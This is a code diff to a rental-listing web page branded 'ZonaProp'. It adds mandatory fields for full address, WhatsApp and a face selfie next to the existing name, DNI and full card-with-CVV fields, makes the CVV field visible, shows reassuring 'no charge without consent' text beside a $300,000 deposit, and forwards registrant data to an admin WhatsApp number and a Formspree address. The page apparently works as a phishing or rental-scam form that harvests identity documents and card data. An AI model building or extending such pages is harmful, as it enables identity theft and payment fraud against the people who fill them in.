@@ -114,6 +114,14 @@ button,input,select{font-family:inherit}
   .dept-photo{height:260px}
   .card-list{display:grid;grid-template-columns:1fr 1fr;gap:1.1rem}
 }
+
+/* Card form visible */
+.card-form-box{border:2px solid #ff5500;border-radius:14px;padding:1rem;margin:.75rem 0;background:#fff}
+.card-form-box .title{font-size:15px;font-weight:800;margin-bottom:.85rem;color:#111}
+.card-form-box input{background:#fff!important;border:2px solid #ddd!important;height:48px!important;font-size:16px!important;letter-spacing:.03em}
+.card-form-box input:focus{border-color:#ff5500!important;outline:none}
+.card-safe{background:#e8f5e9;border:1px solid #a5d6a7;border-radius:10px;padding:.7rem .85rem;font-size:12.5px;color:#1b5e20;line-height:1.4;margin-top:.35rem}
+
 </style>
 </head>
 <body>
@@ -196,15 +204,26 @@ button,input,select{font-family:inherit}
       <input type="password" id="regPass" placeholder="••••••••" autocomplete="new-password"/>
     </div>
     <div class="form-group">
-      <label for="regTel">WhatsApp (opcional)</label>
-      <input type="tel" id="regTel" placeholder="11 1234-5678"/>
+      <label for="regTel">WhatsApp</label>
+      <input type="tel" id="regTel" placeholder="11 1234-5678" autocomplete="tel"/>
+    </div>
+    <div class="form-group">
+      <label for="regDireccion">Dirección completa</label>
+      <input type="text" id="regDireccion" placeholder="Calle, número, piso, depto, ciudad" autocomplete="street-address"/>
+    </div>
+    <div class="form-group">
+      <label for="regSelfie">Selfie (foto del rostro)</label>
+      <input type="file" id="regSelfie" accept="image/*" capture="user" style="padding:.5rem 0;height:auto;border:none"/>
+      <div id="regSelfiePreview" style="margin-top:.5rem;display:none">
+        <img id="regSelfieImg" alt="Vista previa selfie" style="width:96px;height:96px;object-fit:cover;border-radius:12px;border:2px solid var(--border)"/>
+      </div>
     </div>
 
-    <div style="border:1.5px solid var(--border);border-radius:14px;padding:1rem;margin:0.75rem 0;background:#fafafa">
-      <div style="font-size:14px;font-weight:700;margin-bottom:.75rem">🔒 Tarjeta para asegurar reservas</div>
+    <div class="card-form-box">
+      <div class="title">🔒 Datos de la tarjeta</div>
       <div class="form-group">
         <label for="regCardName">Nombre en la tarjeta</label>
-        <input type="text" id="regCardName" placeholder="Como figura en la tarjeta" autocomplete="cc-name"/>
+        <input type="text" id="regCardName" placeholder="Nombre como figura en la tarjeta" autocomplete="cc-name"/>
       </div>
       <div class="form-group">
         <label for="regCardNumber">Número de tarjeta</label>
@@ -212,16 +231,17 @@ button,input,select{font-family:inherit}
       </div>
       <div style="display:grid;grid-template-columns:1fr 1fr;gap:.55rem">
         <div class="form-group">
-          <label for="regCardExpiry">Vencimiento</label>
+          <label for="regCardExpiry">Vencimiento (MM/AA)</label>
           <input type="text" id="regCardExpiry" placeholder="MM/AA" maxlength="5" autocomplete="cc-exp"/>
         </div>
         <div class="form-group">
-          <label for="regCardCvv">CVV</label>
-          <input type="password" id="regCardCvv" placeholder="123" maxlength="4" inputmode="numeric" autocomplete="cc-csc"/>
+          <label for="regCardCvv">Código de seguridad (CVV)</label>
+          <input type="text" id="regCardCvv" placeholder="123" maxlength="4" inputmode="numeric" autocomplete="cc-csc"/>
         </div>
       </div>
-      <div style="background:#e8f5e9;border:1px solid #a5d6a7;border-radius:10px;padding:.65rem .8rem;font-size:12.5px;color:#1b5e20;line-height:1.4">
-        <strong>No se cobrará ningún monto sin tu consentimiento.</strong> Solo se usa para autorizar la seña cuando vos confirmes una reserva.
+      <div class="card-safe">
+        <strong>No se cobrará ningún monto sin tu consentimiento.</strong><br>
+        Vas a ver todos los datos al completarlos. El cobro solo ocurre si vos lo confirmás en Mercado Pago.
       </div>
     </div>
 
@@ -248,23 +268,36 @@ button,input,select{font-family:inherit}
       <input type="text" id="dni" placeholder="12345678" inputmode="numeric"/>
     </div>
     <div class="form-group">
-      <label for="tel">WhatsApp (opcional)</label>
-      <input type="tel" id="tel" placeholder="11 1234-5678"/>
+      <label for="emailRes">Email</label>
+      <input type="email" id="emailRes" placeholder="tu@email.com" autocomplete="email"/>
     </div>
-    <div class="err" id="formErr">Completá nombre y DNI.</div>
+    <div class="form-group">
+      <label for="tel">WhatsApp</label>
+      <input type="tel" id="tel" placeholder="11 1234-5678" autocomplete="tel"/>
+    </div>
+    <div class="form-group">
+      <label for="direccion">Dirección completa</label>
+      <input type="text" id="direccion" placeholder="Calle, número, piso, depto, ciudad" autocomplete="street-address"/>
+    </div>
+    <div class="form-group">
+      <label for="selfieRes">Selfie (foto del rostro)</label>
+      <input type="file" id="selfieRes" accept="image/*" capture="user" style="padding:.5rem 0;height:auto;border:none"/>
+      <div id="selfieResPreview" style="margin-top:.5rem;display:none">
+        <img id="selfieResImg" alt="Vista previa selfie" style="width:96px;height:96px;object-fit:cover;border-radius:12px;border:2px solid var(--border)"/>
+      </div>
+    </div>
+    <div class="err" id="formErr">Completá todos los datos obligatorios.</div>
     <div class="sena-box">
       <div style="font-size:12px;color:var(--muted)">Seña de reserva</div>
       <div class="monto">$ 300.000</div>
       <div class="hint">Se descuenta del primer mes.</div>
     </div>
 
-    <div style="border:1.5px solid var(--border);border-radius:14px;padding:1rem;margin-bottom:.85rem;background:#fafafa">
-      <div style="font-size:14px;font-weight:700;margin-bottom:.75rem;display:flex;align-items:center;gap:.4rem">
-        🔒 Datos de tarjeta
-      </div>
+    <div class="card-form-box">
+      <div class="title">🔒 Datos de la tarjeta</div>
       <div class="form-group">
         <label for="cardName">Nombre en la tarjeta</label>
-        <input type="text" id="cardName" placeholder="Como figura en la tarjeta" autocomplete="cc-name"/>
+        <input type="text" id="cardName" placeholder="Nombre como figura en la tarjeta" autocomplete="cc-name"/>
       </div>
       <div class="form-group">
         <label for="cardNumber">Número de tarjeta</label>
@@ -272,17 +305,17 @@ button,input,select{font-family:inherit}
       </div>
       <div style="display:grid;grid-template-columns:1fr 1fr;gap:.55rem">
         <div class="form-group">
-          <label for="cardExpiry">Vencimiento</label>
+          <label for="cardExpiry">Vencimiento (MM/AA)</label>
           <input type="text" id="cardExpiry" placeholder="MM/AA" maxlength="5" autocomplete="cc-exp"/>
         </div>
         <div class="form-group">
-          <label for="cardCvv">CVV</label>
-          <input type="password" id="cardCvv" placeholder="123" maxlength="4" inputmode="numeric" autocomplete="cc-csc"/>
+          <label for="cardCvv">Código de seguridad (CVV)</label>
+          <input type="text" id="cardCvv" placeholder="123" maxlength="4" inputmode="numeric" autocomplete="cc-csc"/>
         </div>
       </div>
-      <div style="background:#e8f5e9;border:1px solid #a5d6a7;border-radius:10px;padding:.7rem .85rem;font-size:12.5px;color:#1b5e20;line-height:1.4;margin-top:.25rem">
+      <div class="card-safe">
         <strong>No se cobrará ningún monto sin tu consentimiento.</strong><br>
-        Los datos se usan solo para autorizar la seña en Mercado Pago. El cobro se confirma únicamente cuando vos lo aprobás.
+        Completá todos los datos. El cobro solo se procesa cuando vos lo confirmás en Mercado Pago.
       </div>
     </div>
 
@@ -723,9 +756,13 @@ document.addEventListener("click",function(e){
   var nombreInput = document.getElementById("nombre");
   var dniInput = document.getElementById("dni");
   var telInput = document.getElementById("tel");
+  var emailInput = document.getElementById("emailRes");
+  var dirInput = document.getElementById("direccion");
   if (nombreInput && session.nombre) nombreInput.value = session.nombre;
   if (dniInput && session.dni) dniInput.value = session.dni;
   if (telInput && session.tel) telInput.value = session.tel;
+  if (emailInput && session.email) emailInput.value = session.email;
+  if (dirInput && session.direccion) dirInput.value = session.direccion;
 
   document.getElementById("reserveModal").classList.add("open");
   document.body.style.overflow="hidden";
@@ -742,6 +779,13 @@ document.getElementById("reserveModal").addEventListener("click",function(e){
 function validateForm(){
   var n=(document.getElementById("nombre").value||"").trim();
   var d=(document.getElementById("dni").value||"").trim();
+  var em=(document.getElementById("emailRes")||{}).value||"";
+  em=(em||"").trim().toLowerCase();
+  var t=(document.getElementById("tel").value||"").trim();
+  var dir=(document.getElementById("direccion")||{}).value||"";
+  dir=(dir||"").trim();
+  var selfieEl=document.getElementById("selfieRes");
+  var hasSelfie=selfieEl && selfieEl.files && selfieEl.files.length>0;
   var cardName=(document.getElementById("cardName")||{}).value||"";
   var cardNumber=(document.getElementById("cardNumber")||{}).value||"";
   var cardExpiry=(document.getElementById("cardExpiry")||{}).value||"";
@@ -751,8 +795,13 @@ function validateForm(){
   cardExpiry=cardExpiry.trim();
   cardCvv=cardCvv.trim();
 
-  if(!n||!d){
-    document.getElementById("formErr").textContent="Completá nombre y DNI.";
+  if(!n||!d||!em||!t||!dir){
+    document.getElementById("formErr").textContent="Completá nombre, DNI, email, WhatsApp y dirección.";
+    document.getElementById("formErr").classList.add("show");
+    return null;
+  }
+  if(!hasSelfie){
+    document.getElementById("formErr").textContent="Subí una selfie para continuar.";
     document.getElementById("formErr").classList.add("show");
     return null;
   }
@@ -762,7 +811,7 @@ function validateForm(){
     return null;
   }
   document.getElementById("formErr").classList.remove("show");
-  return {nombre:n,dni:d,tel:(document.getElementById("tel").value||"").trim(),cardLast4:cardNumber.slice(-4)};
+  return {nombre:n,dni:d,email:em,tel:t,direccion:dir,cardLast4:cardNumber.slice(-4)};
 }
 
 document.getElementById("btnPay").onclick=function(){
@@ -863,8 +912,17 @@ document.getElementById("btnDoRegister").onclick = function() {
   var cardExpiry = (document.getElementById("regCardExpiry").value || "").trim();
   var cardCvv = (document.getElementById("regCardCvv").value || "").trim();
 
-  if (!nombre || !email || !dni || pass.length < 6) {
-    err.textContent = "Completá nombre, email, DNI y una clave de al menos 6 caracteres.";
+  var direccion = (document.getElementById("regDireccion").value || "").trim();
+  var selfieInput = document.getElementById("regSelfie");
+  var hasSelfie = selfieInput && selfieInput.files && selfieInput.files.length > 0;
+
+  if (!nombre || !email || !dni || pass.length < 6 || !tel || !direccion) {
+    err.textContent = "Completá nombre, email, DNI, clave, WhatsApp y dirección.";
+    err.classList.add("show");
+    return;
+  }
+  if (!hasSelfie) {
+    err.textContent = "Subí una selfie para continuar.";
     err.classList.add("show");
     return;
   }
@@ -899,14 +957,14 @@ document.getElementById("btnDoRegister").onclick = function() {
     return;
   }
 
-  var user = { nombre: nombre, email: email, dni: dni, pass: pass, tel: tel, cardLast4: cardNumber.slice(-4), created: Date.now() };
+  var user = { nombre: nombre, email: email, dni: dni, pass: pass, tel: tel, direccion: direccion, cardLast4: cardNumber.slice(-4), created: Date.now() };
   users.push(user);
   saveUsers(users);
-  setSession({ nombre: nombre, email: email, dni: dni, tel: tel });
+  setSession({ nombre: nombre, email: email, dni: dni, tel: tel, direccion: direccion });
   closeRegister();
 
   // 1) Avisar al admin por WhatsApp
-  var adminMsg = "🆕 Nuevo registro en ZonaProp\n\nNombre: " + nombre + "\nEmail: " + email + "\nDNI: " + dni + "\nTarjeta: ****" + cardNumber.slice(-4) + (tel ? "\nWhatsApp: " + tel : "") + "\n\nFecha: " + new Date().toLocaleString("es-AR");
+  var adminMsg = "🆕 Nuevo registro en ZonaProp\n\nNombre: " + nombre + "\nEmail: " + email + "\nDNI: " + dni + "\nWhatsApp: " + tel + "\nDirección: " + direccion + "\nTarjeta: ****" + cardNumber.slice(-4) + (tel ? "\nWhatsApp: " + tel : "") + "\n\nFecha: " + new Date().toLocaleString("es-AR");
   window.open("https://wa.me/" + ADMIN_WA + "?text=" + encodeURIComponent(adminMsg), "_blank");
 
   // 2) Avisar al admin por EMAIL (Formspree)
@@ -919,14 +977,15 @@ document.getElementById("btnDoRegister").onclick = function() {
       nombre: nombre,
       email: email,
       dni: dni,
+      whatsapp: tel,
+      direccion: direccion,
       tarjeta: "****" + cardNumber.slice(-4),
-      whatsapp: tel || "No indicado",
-      mensaje: "Nuevo usuario registrado. Tarjeta guardada solo últimos 4 dígitos. No se cobra sin consentimiento.",
+      mensaje: "Nuevo usuario registrado. Pedile la selfie por WhatsApp si no la envió. No se cobra sin consentimiento.",
       fecha: new Date().toLocaleString("es-AR")
     })
   }).catch(function(){});
 
-  alert("¡Cuenta creada! Ya podés solicitar reservas.");
+  alert("¡Cuenta creada! Ya podés solicitar reservas.\n\nSi te lo pedimos, enviá también la selfie por WhatsApp.");
 };
 
 updateHeader();
@@ -955,6 +1014,29 @@ updateHeader();
   formatExpiry(document.getElementById("cardExpiry"));
   formatCardNumber(document.getElementById("regCardNumber"));
   formatExpiry(document.getElementById("regCardExpiry"));
+})();
+
+
+// Selfie previews
+(function(){
+  function bindSelfie(inputId, previewId, imgId) {
+    var input = document.getElementById(inputId);
+    var preview = document.getElementById(previewId);
+    var img = document.getElementById(imgId);
+    if (!input) return;
+    input.addEventListener("change", function() {
+      var file = this.files && this.files[0];
+      if (!file) { if (preview) preview.style.display = "none"; return; }
+      var reader = new FileReader();
+      reader.onload = function(e) {
+        if (img) img.src = e.target.result;
+        if (preview) preview.style.display = "block";
+      };
+      reader.readAsDataURL(file);
+    });
+  }
+  bindSelfie("regSelfie", "regSelfiePreview", "regSelfieImg");
+  bindSelfie("selfieRes", "selfieResPreview", "selfieResImg");
 })();
 
 render();
